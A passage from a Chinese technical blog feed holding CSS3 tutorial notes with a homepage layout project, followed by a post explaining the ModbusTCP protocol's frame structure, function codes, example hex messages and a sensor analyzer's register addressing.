class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-image: repeating-linear-gradient(red, yellow 10%, green 20%);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217185321.png" alt="image-20211217185319867"></p></li></ul><h2 id="CSS3文本效果"><a href="#CSS3文本效果" class="headerlink" title="CSS3文本效果"></a>CSS3文本效果</h2><ul><li><p>文本阴影</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-shadow: 5px 5px 5px #FF0000;</span><br></pre></td></tr></table></figure></li><li><p>文本溢出</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217185653.png" alt="image-20211217185652629"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217185736.png" alt="image-20211217185734974"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217185907.png" alt="image-20211217185902847"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217190102.png" alt="image-20211217190100518"></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 超过1行省略&#x2F;裁剪 *&#x2F;</span><br><span class="line">overflow: hidden;</span><br><span class="line">white-space: nowrap;</span><br><span class="line">text-overflow: ellipsis | clip; </span><br><span class="line"></span><br><span class="line">&#x2F;* 超过2行省略&#x2F;裁剪 *&#x2F;</span><br><span class="line">overflow: hidden;</span><br><span class="line">text-overflow: ellipsis;</span><br><span class="line">display: -webkit-box;</span><br><span class="line">-webkit-box-orient: vertical;</span><br><span class="line">-webkit-line-clamp: 2;</span><br></pre></td></tr></table></figure><ul><li><p>文本换行</p><ul><li><p>长文本换行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word-wrap:break-word;</span><br></pre></td></tr></table></figure></li><li><p>单词拆分换行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word-break: break-all;</span><br></pre></td></tr></table></figure></li></ul><h1 id="CSS3网格布局（grid）"><a href="#CSS3网格布局（grid）" class="headerlink" title="CSS3网格布局（grid）"></a>CSS3网格布局（grid）</h1></li><li><p>应用场景</p><ul><li>flex布局、float布局应用于一维布局，网格布局应用于二位布局</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217190448.png" alt="image-20211217190447184"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217191306.png" alt="image-20211217191304293"></p></li><li><p>父元素属性</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 使用 *&#x2F;</span><br><span class="line">display: grid;</span><br><span class="line">grid-template-columns: 10px 10px 10px;</span><br><span class="line">grid-template-rows: 10px 10px 10px;</span><br><span class="line"></span><br><span class="line">&#x2F;* 百分比使用 *&#x2F;</span><br><span class="line">display: grid;</span><br><span class="line">grid-template-columns: 33.33% 33.33% 33.33%;</span><br><span class="line">grid-template-rows: 33.33% 33.33% 33.33%;</span><br><span class="line"></span><br><span class="line">&#x2F;* repeat()函数简化 *&#x2F;</span><br><span class="line">display: grid;</span><br><span class="line">grid-template-columns: repeat(3, 33.33%);</span><br><span class="line">grid-template-rows: repeat(3, 33.33%);</span><br></pre></td></tr></table></figure><h1 id="在线教育首页多功能实战"><a href="#在线教育首页多功能实战" class="headerlink" title="在线教育首页多功能实战"></a>在线教育首页多功能实战</h1><h2 id="真实的项目开发是怎么样的以及页面实战分析"><a href="#真实的项目开发是怎么样的以及页面实战分析" class="headerlink" title="真实的项目开发是怎么样的以及页面实战分析"></a>真实的项目开发是怎么样的以及页面实战分析</h2><ul><li>真实项目开发流程<ul><li>需求评审</li><li>与UI对接设计图</li><li>开发页面</li><li>与后端程序员协调接口协议</li><li>接入接口数据联调</li><li>开发完成，提交测试环境，自测完成然后提测</li><li>解决bug</li><li>提交预发环境</li><li>产品，测试确认，与后端一起提交上正式环境（上线）</li></ul></li><li>页面分析</li></ul><h2 id="项目初始化和阿里巴巴矢量库的使用"><a href="#项目初始化和阿里巴巴矢量库的使用" class="headerlink" title="项目初始化和阿里巴巴矢量库的使用"></a>项目初始化和阿里巴巴矢量库的使用</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217192019.png" alt="image-20211217192017679"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217192049.png" alt="image-20211217192047434"></p><ul><li><p>项目初始化</p><ul><li>新建文件夹</li><li>初始化css样式：去掉初始的margin值，li标签的点去掉等等</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217192415.png" alt="image-20211217192413662"></p></li><li><p>阿里巴巴矢量库</p><ul><li><p>地址</p><ul><li><a href="https://www.iconfont.cn/" target="_blank" rel="noopener">https://www.iconfont.cn/</a></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217192805.png" alt="image-20211217192803754"></p></li><li><p>流程</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 注册</span><br><span class="line">- 搜索图片</span><br><span class="line">- 加入购物车</span><br><span class="line">- 添加进项目、选择symbol格式</span><br><span class="line">- 生成在线链接</span><br></pre></td></tr></table></figure></li><li><p>引入第三方icon </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 根文件html引入  注意：xxxxxxxx是自己项目的在线链接</span><br><span class="line">&lt;script src&#x3D;&quot;http:xxxxxxxx&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 使用 注意 xxxx是icon的代码</span><br><span class="line">&lt;svg class&#x3D;&quot;icon&quot; aria-hidden&#x3D;&quot;true&quot;&gt;</span><br><span class="line">    &lt;use xlink:href&#x3D;&quot;#xxxx&quot;&gt;&lt;&#x2F;use&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217192945.png" alt="image-20211217192944166"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217192928.png" alt="image-20211217192926559"></p></li></ul><h2 id="小滴课堂首页导航栏开发"><a href="#小滴课堂首页导航栏开发" class="headerlink" title="小滴课堂首页导航栏开发"></a>小滴课堂首页导航栏开发</h2><p><strong>首页导航栏的开发</strong></p><p> <img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217143448.png" alt="image-20211217143447072"></p><h2 id="小滴课堂首页轮播图开发"><a href="#小滴课堂首页轮播图开发" class="headerlink" title="小滴课堂首页轮播图开发"></a>小滴课堂首页轮播图开发</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217200501.png" alt="image-20211217200458785"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217200517.png" alt="image-20211217200515173"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217143526.png" alt="image-20211217143525571"></p><h2 id="小滴课堂首页课程列表开发上"><a href="#小滴课堂首页课程列表开发上" class="headerlink" title="小滴课堂首页课程列表开发上"></a>小滴课堂首页课程列表开发上</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217143545.png" alt="image-20211217143543579"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217203137.png" alt="image-20211217203135813"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217203514.png" alt="image-20211217203512400"></p><h2 id="小滴课堂首页课程列表开发下"><a href="#小滴课堂首页课程列表开发下" class="headerlink" title="小滴课堂首页课程列表开发下"></a>小滴课堂首页课程列表开发下</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217211452.png" alt="image-20211217143556092"></p><h2 id="小滴课堂首页底部开发"><a href="#小滴课堂首页底部开发" class="headerlink" title="小滴课堂首页底部开发"></a>小滴课堂首页底部开发</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217143609.png" alt="image-20211217143607468"></p><h1 id="接下来"><a href="#接下来" class="headerlink" title="接下来"></a>接下来</h1><ul><li>项⽬开发过程<ul><li>先分析⼀个布局，分块细⼀点</li><li>写对应的注释</li><li>考虑周全⼀点</li></ul></li><li>项⽬遇到的问题<ul><li>布局乱了怎么办<ul><li>检查其他盒⼦的⾼度是否影响了</li></ul></li><li>换着思路实现问题，⽐如我们的伪类来实现布局</li><li>学会iconfont使⽤</li><li>未来的规划<ul><li>html + css(最基本的)</li><li>js(跟⽹⻚交互使⽤的) javascript<ul><li>Vue.js</li><li>React.js</li></ul></li></ul></li><li>项⽬的构建<ul><li>git(代码管理⼯具)</li><li>webpack(打包⼯具，打包资源代码)</li></ul></li><li>后端<ul><li>node.js(多了操作数据库的api)</li></ul></li><li>学习技巧<ul><li>只有当你的实际练习（写代码）⼤⼤于你的理论学习时间， 你才会有进步</li><li>锻炼下⾃⼰独⽴学习能⼒(必须学会看懂编辑器的提示，学会翻译)</li><li>多多看mdn⽂档，博⽂只能参考</li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;迈入前端的第一步&quot;&gt;&lt;a href=&quot;#迈入前端的第一步&quot; class=&quot;headerlink&quot; title=&quot;迈入前端的第一步&quot;&gt;&lt;/a&gt;迈入前端的第一步&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;独⽴内核的浏览器的分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Chrome: Webk
      
    
    </summary>
    
    
      <category term="前端" scheme="https://blog.kaluna.top/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="HTML" scheme="https://blog.kaluna.top/tags/HTML/"/>
    
      <category term="CSS" scheme="https://blog.kaluna.top/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>ModbusTCP协议</title>
    <link href="https://blog.kaluna.top/2021/12/10/ModbusTCP%E5%8D%8F%E8%AE%AE/"/>
    <id>https://blog.kaluna.top/2021/12/10/ModbusTCP%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-12-10T12:27:29.781Z</published>
    <updated>2021-12-19T12:32:05.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ModbusTCP协议简介"><a href="#ModbusTCP协议简介" class="headerlink" title="ModbusTCP协议简介"></a>ModbusTCP协议简介</h1><p>Modbus由MODICON公司于1979年开发，是一种工业现场总线协议标准。1996年施耐德公司推出基于以太网TCP/IP的Modbus协议：ModbusTCP。</p><p>Modbus协议是一项应用层报文传输协议，包括ASCII、RTU、TCP三种报文类型。</p><p>标准的Modbus协议物理层接口有RS232、RS422、RS485和以太网接口，采用master/slave方式通信。</p><h1 id="ModbusTCP数据帧"><a href="#ModbusTCP数据帧" class="headerlink" title="ModbusTCP数据帧"></a>ModbusTCP数据帧</h1><p>ModbusTCP的数据帧可分为两部分：<strong>MBAP</strong>+PDU</p><h2 id="报文头MBAP"><a href="#报文头MBAP" class="headerlink" title="报文头MBAP"></a>报文头MBAP</h2><p>MBAP为报文头，长度为7字节，组成如下：</p><table><thead><tr><th>事务处理标识</th><th>协议标识</th><th>长度</th><th>单元标识符</th></tr></thead><tbody><tr><td>2字节</td><td>2字节</td><td>2字节</td><td>1字节</td></tr></tbody></table><table><thead><tr><th>内容</th><th>解释</th></tr></thead><tbody><tr><td><strong>事务处理标识</strong></td><td>可以理解为报文的序列号，一般每次通信之后就要加1以区别不同的通信数据报文。</td></tr><tr><td><strong>协议标识符</strong></td><td>00 00表示ModbusTCP协议。</td></tr><tr><td><strong>长度</strong></td><td>表示接下来的数据长度，单位为字节。</td></tr><tr><td><strong>单元标识符</strong></td><td>可以理解为设备地址。</td></tr></tbody></table><h2 id="帧结构PDU"><a href="#帧结构PDU" class="headerlink" title="帧结构PDU"></a>帧结构PDU</h2><p>PDU由<strong>功能码+数据</strong>组成。功能码为1字节，数据长度不定，由具体功能决定。</p><h3 id="功能码"><a href="#功能码" class="headerlink" title="功能码"></a>功能码</h3><p>Modbus的操作对象有四种：线圈、离散输入、输入寄存器、保持寄存器。</p><table><thead><tr><th>对象</th><th>含义</th></tr></thead><tbody><tr><td>线圈</td><td>PLC的输出位，开关量，在Modbus中可读可写</td></tr><tr><td>离散量</td><td>PLC的输入位，开关量，在Modbus中只读</td></tr><tr><td>输入寄存器</td><td>PLC中只能从模拟量输入端改变的寄存器，在Modbus中只读</td></tr><tr><td>保持寄存器</td><td>PLC中用于输出模拟量信号的寄存器，在Modbus中可读可写</td></tr></tbody></table><p>根据对象的不同，Modbus的功能码有：</p><table><thead><tr><th>功能码</th><th>含义</th></tr></thead><tbody><tr><td>0x01</td><td>读线圈</td></tr><tr><td>0x05</td><td>写单个线圈</td></tr><tr><td>0x0F</td><td>写多个线圈</td></tr><tr><td>0x02</td><td>读离散量输入</td></tr><tr><td>0x04</td><td>读输入寄存器</td></tr><tr><td>0x03</td><td>读保持寄存器</td></tr><tr><td>0x06</td><td>写单个保持寄存器</td></tr><tr><td>0x10</td><td>写多个保持寄存器</td></tr></tbody></table><h3 id="PDU详细结构"><a href="#PDU详细结构" class="headerlink" title="PDU详细结构"></a>PDU详细结构</h3><p><strong>0x01：读线圈</strong></p><p>在从站中读1~2000个连续线圈状态，ON=1,OFF=0</p><ul><li>请求：MBAP 功能码 起始地址H 起始地址L 数量H 数量L（共12字节）</li><li>响应：MBAP 功能码 数据长度 数据（一个地址的数据为1位）</li><li>如：在从站0x01中，读取开始地址为0x0002的线圈数据，读0x0008位<br>00 01 00 00 00 06 01 01 00 02 00 08</li><li>回：数据长度为0x01个字节，数据为0x01，第一个线圈为ON，其余为OFF<br>00 01 00 00 00 04 01 01 01 01</li></ul><p><strong>0x05：写单个线圈</strong><br>将从站中的一个输出写成ON或OFF，0xFF00请求输出为ON,0x000请求输出为OFF</p><ul><li>请求：MBAP 功能码 输出地址H 输出地址L 输出值H 输出值L（共12字节）</li><li>响应：MBAP 功能码 输出地址H 输出地址L 输出值H 输出值L（共12字节）</li><li>如：将地址为0x0003的线圈设为ON<br>00 01 00 00 00 06 01 05 00 03 FF 00</li><li>回：写入成功<br>00 01 00 00 00 06 01 05 00 03 FF 00</li></ul><p><strong>0x0F：写多个线圈</strong><br>将一个从站中的一个线圈序列的每个线圈都强制为ON或OFF，数据域中置1的位请求相应输出位ON，置0的位请求响应输出为OFF</p><ul><li>请求：MBAP 功能码 起始地址H 起始地址L 输出数量H 输出数量L 字节长度 输出值H 输出值L</li><li>响应：MBAP 功能码 起始地址H 起始地址L 输出数量H 输出数量L</li></ul><p><strong>0x02：读离散量输入</strong><br>从一个从站中读1~2000个连续的离散量输入状态</p><ul><li>请求：MBAP 功能码 起始地址H 起始地址L 数量H 数量L（共12字节）</li><li>响应：MBAP 功能码 数据长度 数据（长度：9+ceil（数量/8））</li><li>如：从地址0x0000开始读0x0012个离散量输入<br>00 01 00 00 00 06 01 02 00 00 00 12</li><li>回：数据长度为0x03个字节，数据为0x01 04 00，表示第一个离散量输入和第11个离散量输入为ON，其余为OFF<br>00 01 00 00 00 06 01 02 03 01 04 00</li></ul><p><strong>0x04：读输入寄存器</strong><br>从一个远程设备中读1~2000个连续输入寄存器</p><ul><li>请求：MBAP 功能码 起始地址H 起始地址L 寄存器数量H 寄存器数量L（共12字节）</li><li>响应：MBAP 功能码 数据长度 寄存器数据(长度：9+寄存器数量×2)</li><li>如：读起始地址为0x0002，数量为0x0005的寄存器数据<br>00 01 00 00 00 06 01 04 00 02 00 05</li><li>回：数据长度为0x0A，第一个寄存器的数据为0x0c，其余为0x00<br>00 01 00 00 00 0D 01 04 0A 00 0C 00 00 00 00 00 00 00 00</li></ul><p><strong>0x03：读保持寄存器</strong><br>从远程设备中读保持寄存器连续块的内容</p><ul><li><p>请求：MBAP 功能码 起始地址H 起始地址L 寄存器数量H 寄存器数量L（共12字节）</p></li><li><p>响应：MBAP 功能码 数据长度 寄存器数据(响应长度：9+寄存器数量×2)</p></li><li><p>如：起始地址是0x0000，寄存器数量是 0x0003<br>00 01 00 00 00 06 01 03 00 00 00 03</p><p>事务处理标识2（0001）+<br>协议标识2（0000）+<br>长度2（0006）+<br>单元标识1（01）+<br>功能码1（03）+<br>起始地址H 起始地址L2（0000）+<br>寄存器数量H 寄存器数量L2（0003）</p></li><li><p>回：数据长度为0x06，第一个寄存器的数据为0x21，其余为0x00<br>00 01 00 00 00 09 01 03 06 00 21 00 00 00 00</p><p>事务处理标识2（0001）+<br>协议标识2（0000）+<br>长度2（0009）+<br>单元标识1（01）+<br>功能码1（03）+<br>数据长度（06）+<br>寄寄存器数据（00 21 00 00 00 00）</p></li></ul><p><strong>0x06：写单个保持寄存器</strong><br>在一个远程设备中写一个保持寄存器</p><ul><li>请求：MBAP 功能码 寄存器地址H 寄存器地址L 寄存器值H 寄存器值L（共12字节）</li><li>响应：MBAP 功能码 寄存器地址H 寄存器地址L 寄存器值H 寄存器值L（共12字节）</li><li>如：向地址是0x0000的寄存器写入数据0x000A<br>00 01 00 00 00 06 01 06 00 00 00 0A</li><li>回：写入成功<br>00 01 00 00 00 06 01 06 00 00 00 0A</li></ul><p><strong>0x10：写多个保持寄存器</strong><br>在一个远程设备中写连续寄存器块（1~123个寄存器）</p><ul><li>请求：MBAP 功能码 起始地址H 起始地址L 寄存器数量H 寄存器数量L 字节长度 寄存器值（13+寄存器数量×2）</li><li>响应：MBAP 功能码 起始地址H 起始地址L 寄存器数量H 寄存器数量L（共12字节）</li><li>如：向起始地址为0x0000，数量为0x0001的寄存器写入数据，数据长度为0x02，数据为0x000F<br>00 01 00 00 00 09 01 10 00 00 00 01 02 00 0F</li><li>回：写入成功<br>00 01 00 00 00 06 01 10 00 00 00 01</li></ul><h2 id="Modbus-TCP-示例报文"><a href="#Modbus-TCP-示例报文" class="headerlink" title="Modbus TCP 示例报文"></a>Modbus TCP 示例报文</h2><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210212534.png" alt="image-20211210212524248"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210212644.png" alt="image-20211210212642091"></p><h1 id="ModbusTCP通信"><a href="#ModbusTCP通信" class="headerlink" title="ModbusTCP通信"></a>ModbusTCP通信</h1><p>Modbus设备可分为主站(poll)和从站(slave)。主站只有一个，从站有多个，主站向各从站发送请求帧，从站给予响应。在使用TCP通信时，主站为client端，主动建立连接；从站为server端，等待连接。</p><ul><li>主站请求：功能码+数据</li><li>从站正常响应：请求功能码+响应数据</li><li>从站异常响应：异常功能码+异常码，其中异常功能码即将请求功能码的最高有效位置1，异常码指示差错类型</li></ul><p><strong>注意：需要超时管理机制，避免无期限的等待可能不出现的应答</strong></p><p>IANA（Internet Assigned Numbers Authority，互联网编号分配管理机构）给Modbus协议赋予TCP端口号为<strong>502</strong>，这是目前在仪表与自动化行业中唯一分配到的端口号。</p><p><strong>通信过程</strong></p><ol><li>connect 建立TCP连接</li><li>准备Modbus报文</li><li>使用send命令发送报文</li><li>在同一连接下等待应答</li><li>使用recv命令读取报文，完成一次数据交换</li><li>通信任务结束时，关闭TCP连接</li></ol><h1 id="仿真软件"><a href="#仿真软件" class="headerlink" title="仿真软件"></a>仿真软件</h1><ul><li>Modbus poll 和Modbus slave是一组Modbus仿真软件，可以实现Modbus RTU、TCP、串口仿真等。</li><li>在ModbusTCP中，Modbus poll 作为客户端请求数据，Modbus slave 作为服务器端处理请求。</li><li>使用c语言编写客户端连接Modbus slave时，注意数据格式，一条指令一次性发出，否则连接会出错。</li><li>使用软件时，需要指定功能码，在setup-&gt;slave definition或者poll definition中进行设置。<br>– slave ID：从站编号（事务标识符）<br>– function：功能码，0x01对应线圈操作，0x02对应离散量操作，0x03对应保持寄存器操作，0x04对应输入寄存器操作<br>– address：开始地址<br>– quantity：寄存器/线圈/离散量 的数量</li></ul><p>在工业自动化控制中，经常会遇到开关量，数字量，模拟量，离散量，脉冲量等各种概念，而人们在实际应用中，对于这些概念又很容易混淆。现将各种概念罗列如下：</p><p>1.开关量：</p><p>一般指的是触点的“开”与“关”的状态，一般在计算机设备中也会用“0”或“1”来表示开关量的状态。开关量分为有源开关量信号和无源开关量信号，有源开关量信号指的是“开”与“关”的状态是带电源的信号，专业叫法为跃阶信号，可以理解为脉冲量，一般的都有220VAC, 110VAC,24VDC,12VDC等信号，无源开关量信号指的是“开”和“关”的状态时不带电源的信号，一般又称之为干接点。电阻测试法为电阻0或无穷大。    </p><p>2.数字量：</p><p>很多人会将数字量与开关量混淆，也将其与模拟量混淆。数字量在时间和数量上都是离散的物理量，其表示的信号则为数字信号。数字量是由0和1组成的信号，经过编码形成有规律的信号，量化后的模拟量就是数字量。    </p><p>3.模拟量：</p><p>模拟量的概念与数字量相对应，但是经过量化之后又可以转化为数字量。模拟量是在时间和数量上都是连续的物理量，其表示的信号则为模拟信号。模拟量在连续的变化过程中任何一个取值都是一个具体有意义的物理量，如温度，电压，电流等。    </p><p>4.离散量：</p><p>离散量是将模拟量离散化之后得到的物理量。即任何仪器设备对于模拟量都不可能有个完全精确的表示，因为他们都有一个采样周期，在该采样周期内，其物理量的数值都是不变的，而实际上的模拟量则是变化的。这样就将模拟量离散化，成为了离散量。   </p><p>5.脉冲量：</p><p>脉冲量就是瞬间电压或电流由某一值跃变到另一值的信号量。在量化后，其变化持续有规律就是数字量，如果其由0变成某一固定值并保持不变，其就是开关量。 </p><blockquote><p>综上所述，模拟量就是在某个过程中时间和数量连续变化的物理量，由于在实际的应用中，所有的仪器设备对于外界数据的采集都有一个采样周期，其采集的数据只有在下一个采样周期开始时才有变动，采样周期内其数值并不随模拟量的变化而变动。<br>这样就将模拟量离散化了，例如：某设备的采样周期为1秒，其在第五秒的时间采集的温度为35度，而第六秒的温度为36度，该设备就只能标称第五秒时间温度35度，第六秒时间温度36度，而第五点五秒的时间其标称也只是35度，但是其实际的模拟量是35.5度。这样就将模拟信号离散化。其采集的数据就是离散化了，不再是连续的模拟量信号。<br>由于计算机只识别0和1两个信号，即开关量信号，用其来表示数值都是使用数字串来表示，由于计算能力的问题，其数字串不能无限长，即其表达的精度也是有限的，同样的以温度为例，由于数字串限制，其表达温度的精度只能达到0.1度，小于该单位的数值则不能被标称，这样就必须将离散量进行量化，将其变为数字量。即35.68度的温度则表示为35.6度。  </p></blockquote><p><strong>ModbusTcp协议客户端实现：</strong></p><p>以下程序是我用NModbus4框架实现，该框架还支持RTU、Ascii格式，但现在TCP是发展趋势，项目中有用到，固使用tcp格式做了个Demo。</p><p>NModbus4框架源码地址： <a href="https://github.com/NModbus4/NModbus4" target="_blank" rel="noopener">https://github.com/NModbus4/NModbus4</a></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211210214109.png" alt="image-20211210214107082"></p><h1 id="Modbus-TCP和Modbus-RTU协议的区别"><a href="#Modbus-TCP和Modbus-RTU协议的区别" class="headerlink" title="Modbus TCP和Modbus RTU协议的区别"></a>Modbus TCP和Modbus RTU协议的区别</h1><p> Modbus协议包括ASCII、RTU、TCP等，并没有规定物理层。此协议定义了控制器能够认识和使用的消息结构，而不管它们是经过何种网络进行通信的。标准的Modicon控制器使用RS232C实现串行的Modbus。Modbus的ASCII、RTU协议规定了消息、数据的结构、命令和就答的方式，数据通讯采用Maser/Slave方式，Master端发出数据请求消息，Slave端接收到正确消息后就可以发送数据到Master端以响应请求，Master端也可以直接发消息修改Slave端的数据，实现双向读写。</p><p>Modbus rtu和Modbus tcp两个协议的本质都是MODBUS协议，都是靠MODBUS寄存器地址来交换数据，但所用的硬件接口不一样，Modbus RTU一般采用串口RS232C或RS485/422，而Modbus TCP一般采用以太网口。现在市场上有很多协议转换器，可以轻松的将这些不同的协议相互转换。</p><p>标准的Modicon控制器使用RS232C实现串行的Modbus。Modbus的ASCII、RTU协议规定了消息、数据的结构、命令和就答的方式，数据通讯采用Maser/Slave方式。Modbus协议需要对数据进行校验，串行协议中除有奇偶校验外，ASCII模式采用LRC校验，RTU模式采用16位CRC校验。</p><p>ModbusTCP模式没有额外规定校验，因为TCP协议是一个面向连接的可靠协议。</p><p>TCP和RTU协议非常类似，只要把RTU协议的两个字节的校验码去掉，然后在RTU协议的开始加上5个0和一个6并通过TCP/IP网络协议发送出去即可。</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="光纤传感分析仪-Modbus-TCP-通讯协议规范"><a href="#光纤传感分析仪-Modbus-TCP-通讯协议规范" class="headerlink" title="光纤传感分析仪 Modbus TCP 通讯协议规范"></a>光纤传感分析仪 Modbus TCP 通讯协议规范</h2><ol><li><p>光纤光栅传感分析仪，提供标准 Modbus TCP 通讯。分析仪设备作为 Modbus TCP 服 务端，上位机作为 TCP 客户端通过 03 功能码读取数据。</p></li><li><p>光纤光栅传感分析仪，提供标准 Modbus TCP 通讯。分析仪设备作为 Modbus TCP 服 务端，上位机作为 TCP 客户端通过 03 功能码读取数据。</p></li><li><p>数据排列格式 </p><p>每个传感器的物理量用 4 字节的 LONG 型数据表示。Modbus 的数据地址从 0000H 开始递增，每一个地址表示一个 2 字节的 WORD 的数据。所以一个物理量在 Modbus 中 需要两个连续的地址。通讯中 4 字节里最高的字节在前、最低的字节在后，与一般的内存顺序正好相反。 要读连续 N 个 传感器的物理量数据，则对应的 Modbus 数据个数为 2N 个，返回的数据字节数为 4N 个。 传感器的传输值为实际值乘以 10000，客户端必须把读取的值除以 10000 才是传感器的实际值，比如传感器的实际值为 12.3456，则传输的值为 123456。</p></li></ol><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211211105523.png" alt="image-20211211105515102"></p><ol start="4"><li>传感器 Modbus 地址计算公式</li></ol><p>设备中的传感器编号(SensorCode)由两部分组成：通道号(ChannelNo，3 位数字长, 范围为 001-032)、在通道中的顺序(SensorIndex，2 位数字长，范围为 01-50)。例如 传感器编号 00201，表示第 2 通道的第 1 个传感器。</p><p>传感器的 Modbus 地址 = (ChannelNo-1)*N + (SensorIndex-1)*2  其中 N=100 或者 48（部分老软件为 48）</p><p>传感器 Modbus 地址计算示例：</p><table><thead><tr><th>传感器编号</th><th></th></tr></thead><tbody><tr><td>00101</td><td>(1-1)*100+(1-1)*2 = 0=0x0000</td></tr><tr><td>00201</td><td>(2-1)*100+(1-1)*2=100=0x0064</td></tr><tr><td>01602</td><td>(16-1)*100 +(2-1)*2=1502=0x05DE</td></tr></tbody></table><ol start="5"><li>计算机发送读数据帧：</li></ol><table><thead><tr><th>内容</th><th>起始（固定5字节）</th><th>后面跟着 的字节数 (从设备地 址开始)</th><th>设备地址 (01~FF)</th><th>功能码(固 定为 03)</th><th>Modbus 数据起始 地址(高字 节在前)</th><th>读连续的 WORD 的 个数(高字 节在前)</th></tr></thead><tbody><tr><td>长度(字节 数)</td><td>5</td><td>1</td><td>1</td><td>1</td><td>2</td><td>2</td></tr><tr><td>示例(16 进制)</td><td>A B 00 00  00**</td><td>06</td><td>01</td><td>03</td><td>0000</td><td>0004</td></tr></tbody></table><p>以上示例指令，表示从地址为 1 的设备，读取从 Modbus 数据地址 0000H 开始的 4 个 WORD 数据，即读连续的 2 个传感器数据， 即 00101 和 00102 传感器。 **A B 为上位机发送过来的命令流水号</p><ol start="6"><li>设备回传数据帧</li></ol><table><thead><tr><th>内容</th><th>起始（固定5字节）</th><th>后面跟着 的字节数 (从设备地址开始)</th><th>设备地址 (01~FF)</th><th>功能码(固 定为 03)</th><th>返回数据的字节数</th><th>返回数据</th></tr></thead><tbody><tr><td>长度(字节 数)</td><td>5</td><td>1</td><td>1</td><td>1</td><td>1</td><td></td></tr><tr><td>示例(16 进制)</td><td>A B 00 00  00**</td><td>0B</td><td>01</td><td>03</td><td>08</td><td>00 01 E2  40 00 31  15 95</td></tr></tbody></table><p>示例数据，返回两个物理量，分别是 12.3456 和 321.6789。 **A B 为上位机发送过来的命令流水号</p><ol start="7"><li><p>示例 </p><p>设备地址 1，从传感器 00101 开始，读连续 2 个传感器的值，即 00101、00102 传感器 </p><p>上位机发送：00 00 00 00 00 06 01 03 00 00 00 04  </p><p>设备回送： 00 00 00 00 00 0B 01 03 08 00 01 E2 40 00 31 15 95  </p><p>设备返回 2 个值 12.3456 和 321.6789  </p><p>对比之前提到的格式</p><blockquote><p>00 01 00 00 00 06 01 03 00 00 00 03</p><p>事务处理标识2（0001）+<br>协议标识2（0000）+<br>长度2（0006）+<br>单元标识1（01）+<br>功能码1（03）+<br>起始地址H 起始地址L2（0000）+<br>寄存器数量H 寄存器数量L2（0003）</p></blockquote></li></ol><p>   设备地址 1，从传感器 00201 开始，读连续 5 个传感器的值，即 00201、00202、00203、 